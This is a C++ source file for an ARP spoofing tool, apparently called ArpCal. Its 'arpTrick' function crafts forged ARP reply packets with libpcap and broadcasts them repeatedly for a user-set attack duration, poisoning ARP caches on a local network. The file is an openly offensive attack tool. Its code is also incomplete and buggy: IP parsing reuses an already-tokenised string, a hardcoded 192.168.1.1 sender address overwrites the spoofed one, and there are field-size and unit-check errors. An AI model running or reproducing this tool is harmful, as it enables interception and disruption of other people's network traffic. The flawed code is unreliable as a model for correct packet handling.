#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include <sys/select.h>
/*include <pcap.h> instead of including <pcap/
  pcap.h> for backwards compatibility      */
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#ifdef HAVE_SYS_SOCKIO_H
    #include <sys/sockio.h>
#endif
#include <unistd.h>
#include <iostream>
#include "arp-trick.h"
#include "parse-options.h"
#include "arp-list.h"
using namespace std;

typedef unsigned char byte;

#define ETHER_ADDR_LEN 6

static void sleep_ms(unsigned int secs)
{
    struct timeval tval;
    tval.tv_sec=secs/1000;
    tval.tv_usec=(secs*1000)%1000000;
    select(0,NULL,NULL,NULL,&tval);
}

struct arpPacket
{
    //TODO: typedef unsigned char byte
    byte dstMacAddr[6];
    byte srcMacAddr[6];
    unsigned char type[2];
    unsigned char hwtype[2];
    unsigned char ip[2];
    unsigned char length;
    unsigned char length2;
    unsigned char sourceMacAddressInsidePacket[6];
    unsigned char sourceIpAddress[4];
    unsigned char targetMacAddressInsidePacket[6];
    unsigned char targetIpAddress[6];
};

static byte dstMacAddr[ETHER_ADDR_LEN]={0xff,0xff,0xff,0xff,0xff,0xff};
static byte srcMacAddr[ETHER_ADDR_LEN];

#define NORETURN __attribute__ ((__noreturn__))

/* Print error message and exit. For backwords compatibility.
   In case we will need _exit() instead of exit().          */
void output_error_msg_and_exit(const char* msg,int errorCode)
{
    cout<<msg<<endl;
    exit(errorCode);
}

/* Get mac address by name and return an array of 
   byte. The size of the array is ETHER_ADDR_LEN. 
   Remember to free the memory returned.        */
char* get_mac_address(char* deviceName)
{
    ifreq ifr;
    int skfd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, deviceName, 16/*IFNameSzie*/);
    if (ioctl(skfd, SIOCGIFHWADDR, &ifr) < 0)//failed.
    {
	output_error_msg_and_exit("error in ioctl with cmd SIOCGIFHWADDR.",0);
    }
    close(skfd);
    char *macAddr = (char*)malloc(6*sizeof(byte));
    memcpy(macAddr,ifr.ifr_hwaddr.sa_data,ETHER_ADDR_LEN);
    return macAddr;
}

void print_macAddr(char* macAddr)
{
    printf("macAddr");
    for(int i=0x6;i<=0xb;i++)
    {
	printf("%02x",(unsigned char)macAddr[i-0x6]);
    }
}

/* TODO: still not completed. */
int check_timeUnit_and_calculate_totalTime(int attackTime,const char* timeUnit)
{
    int totalTime=0;
    if(!strcmp(timeUnit,"second")||!strcmp(timeUnit,"seconds"))
    {
	totalTime = attackTime;
    }
    else if(!strcmp(timeUnit,"minute")||!strcmp(timeUnit,"minutes"))
    {
	totalTime = attackTime*60;
    }
    else if(!strcmp(timeUnit,"hour")||!strcmp(timeUnit,"hour"))
    {
	totalTime = attackTime*3600;
    }
    else
    {
	const char* errMsg= "timeUnit error.\ttimeUnit={second[s]|minute[s]|hour[s]}\tsee ArpCal --help";
	//TODO:errorCode
	output_error_msg_and_exit(errMsg,0);
    }
    return totalTime;
}

/* #define ETHER_ADDR_LEN 6 */
/*{
    char* dstAddr = get_mac_address(deviceName);
    set_ether_header_for_packet(packet,dstAddr,srcAddr);
    free(dstAddr);
    set_
    memcpy(packet->)
}*/
void set_ether_header_for_packet(arpPacket* packet,char* dstMacAddr,char* srcMacAddr)
{
    memcpy(packet->dstMacAddr,dstMacAddr,ETHER_ADDR_LEN);
    memcpy(packet->srcMacAddr,srcMacAddr,ETHER_ADDR_LEN);
    //ether_type
}
//void arpTrick(int argc,char *argv[]);
void arpTrick(char* ipAddr,char* spoofingIP,int attackTime,const char* timeUnit,int intervalTime)
{
    /*Total packets sent.*/
    int totalPackets =0;

    /*Packet to sent.*/
    unsigned char packet[42];/*byte*/
    
    /*check the validity of timeUnit & calculate totaltime*/ 
    int totalTime = check_timeUnit_and_calculate_totalTime(attackTime,timeUnit);

    /*Check the validity of ip address*/
    if(is_IPAddress_valid(ipAddr))
    {
	cout<<"Checking the validity of tricked ip address."<<endl;
	const char * split = "."; 
	char * p;
	int tag=0x26;
	p = strtok (ipAddr,split);
	packet[tag]=atoi(p);
	tag++;
	/*This loop can not work alone. It doesn't check the 
	  validity of ip address. Use is_IPAddress_valid(char*) 
	  to check the validity in advance.                   
	  It supposed that the ip is valid and cast it into 4
	  hexadecimal integers.                              */	
	while(p!=NULL)
	{
	    p=strtok(NULL,split);
	    if(p!=NULL)
		{
		    packet[tag]=atoi(p);
		}
	    tag++;
	}
    }
    else
    {
	cout<<"ip address format error. [xx.xx.xx.xx]"<<endl;
	return;
    }

    /*Check the validity of spoofing ip address*/
    if(is_IPAddress_valid(spoofingIP))
    {
	const char * split = "."; 
	char * p;
	int tag=0x1c;
	p = strtok (ipAddr,split);
	packet[tag]=atoi(p);
	tag++;
	while(p!=NULL)
	{
	    p=strtok(NULL,split);
	    if(p!=NULL)
		{
		    packet[tag]=atoi(p);
		}
	    tag++;
	}
    }
    else
    {
	cout<<"spoofing ip address format error. [xx.xx.xx.xx]"<<endl;
	return;
    }

    char errBuf[PCAP_ERRBUF_SIZE];
    char * deviceName;  
    /*look for suitable device.*/
    cout<<"Looking for suitable device...";
    deviceName = pcap_lookupdev(errBuf);
    
    if(deviceName)//success 
    {  
	cout<<"done.  device:"<<deviceName<<endl;
    }
    else          //fail
    {
	cout<<"error. "<<errBuf<<endl;
        return ;
    }
    char* temp = get_mac_address(deviceName);
    for(int i=0;i<6;i++)
    {
	printf("%02x",(unsigned char)temp[i]);
	//cout<<hex<<(unsigned char)temp[i]<<endl;
    }
    /*open the device by name*/
    cout<<"Opening the device...";
    pcap_t *fp;
    if((fp=pcap_open_live(
	deviceName,        /*device name*/
	100,               /*portion of the packet to capture*/
	1,
	1000,
	errBuf
	))==NULL)
    {
	cout<<"error. unable to open the adaper."<<endl;
	cout<<errBuf<<endl;
	cout<<"try sudo ArpCal [-a]."<<endl;
	return;
    }

    cout<<"done."<<endl;

    /*set mac addr for packet*/
    //set_srcmac_for_packet();
    //TODO:encapsulate
    cout<<"deviceName"<<deviceName<<endl;
    ifreq ifr;
    char *ifname = deviceName;
    int skfd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, ifname, 16/*IFNameSzie*/);
    if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0) {
	close(skfd);
	return;
    }
    strncpy(ifr.ifr_name, ifname, 16);
    if (ioctl(skfd, SIOCGIFHWADDR, &ifr) >= 0)//success
    {/*do nothing*/}
	//memcpy(ife->hwaddr, ifr.ifr_hwaddr.sa_data, 8);
    cout<<"ife->hwaddr:";
    for(int i=0x6;i<=0xb;i++)
    {
	packet[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x6];
	printf("%02x",(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x6]);
    }
    for(int i=0x16;i<=0x1b;i++)
    {
	packet[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x16];
	printf("%02x",(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x16]);
    }

    /* set target mac address */
    packet[0x0] = 0xff;
    packet[0x1] = 0xff;
    packet[0x2] = 0xff;
    packet[0x3] = 0xff;
    packet[0x4] = 0xff;
    packet[0x5] = 0xff;

    /* set mac source */
    /*
    packet[0x6] = 0x14;
    packet[0x7] = 0x2d;
    packet[0x8] = 0x27;
    packet[0x9] = 0xee;
    packet[0xa] = 0x29;
    packet[0xb] = 0xd7;*/

    /* set arp type */
    packet[0xc] = 0x08;
    packet[0xd] = 0x06;
    /* set hardware type */
    packet[0xe] = 0x00;
    packet[0xf] = 0x01;

    packet[0x10] = 0x08;
    packet[0x11] = 0x00;
    packet[0x12] = 0x06;
    packet[0x13] = 0x04;
    packet[0x14] = 0x00;
    packet[0x15] = 0x02;
   
    //src mac
    /*
    packet[0x16] = 0x14;
    packet[0x17] = 0x2d;
    packet[0x18] = 0x27;
    packet[0x19] = 0xee;
    packet[0x1a] = 0x29;
    packet[0x1b] = 0xd7;*/

    //src ip
    packet[0x1c] = 0xc0;
    packet[0x1d] = 0xa8;
    packet[0x1e] = 0x01;
    packet[0x1f] = 0x01;
    //target mac. do not need to fill in this situation.
    //let them all be 0.
    packet[0x20] = 0x00;
    packet[0x21] = 0x00;
    packet[0x22] = 0x00;
    packet[0x23] = 0x00;
    packet[0x24] = 0x00;
    packet[0x25] = 0x00;
    //target ip
    /*
    packet[0x26] = 0xff;
    packet[0x27] = 0xff;
    packet[0x28] = 0xff;
    packet[0x29] = 0xff;
    */


    arpPacket *pa;
    pa=(arpPacket*)&packet;
    for(int x=0;x<6;x++)
    {
	cout<<hex<<(int)pa->dstMacAddr[x]<<endl;
    }


    if(!pcap_sendpacket(fp,packet,42/*size*/))
    {
	cout<<"Start senting down packet."<<endl;
    }
    else
    {
	fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(fp));
	return;
    }

    const time_t start_time = time(NULL); /*get start time*/
    //cout<<start_time<<endl;
    
    while(true)
    {
	sleep_ms(intervalTime);
	pcap_sendpacket(fp,packet,42/*size*/);
	totalPackets++;
	const time_t mid_time = time(NULL);
	cout<<dec<<totalTime-(mid_time-start_time)<<" "<<flush;/*Flush output buffer.*/
	cout<<"\b\b\b\b";
	if(mid_time-start_time>=totalTime)
	    break;
    }

    const time_t end_time = time(NULL);   /*get end time*/
    //cout<<end_time<<endl;
    /*Close the device*/
    pcap_close(fp);
    cout<<"Work done, closing the devcie...done."<<endl;
    cout<<totalPackets<<" packets have been sent in "<<end_time-start_time<<" "<<timeUnit<<"."<<endl;
    cout<<"Average:"<<(float)totalPackets/totalTime<<" packets per second."<<endl;
}
